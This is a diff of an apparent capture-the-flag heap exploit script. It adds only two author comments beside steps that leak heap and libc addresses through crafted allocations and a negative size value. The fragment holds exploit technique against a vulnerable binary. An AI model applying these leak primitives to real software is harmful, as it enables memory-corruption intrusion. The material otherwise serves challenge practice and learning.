@@ -181,7 +181,7 @@ while True:
 
     print("Leaking heap address")
     AddVulnType(0x100, b'A', 0)
-    AddVulnType(0x100, b'B', 0)
+    AddVulnType(0x100, b'B', 0) # This only works since calloc skip tcache
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'C')
@@ -199,7 +199,7 @@ while True:
 
     print("Leaking libc address")
     AddVulnType(0x420, b'D', 0)
-    AddVulnType(0x420, b'E', 0)
+    AddVulnType(0x420, b'E', 0) # Actually there's no need for this, I copied this from above when leaking heap, but I've already finish the exploit, I'm too lazy to change anything :/
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'F')
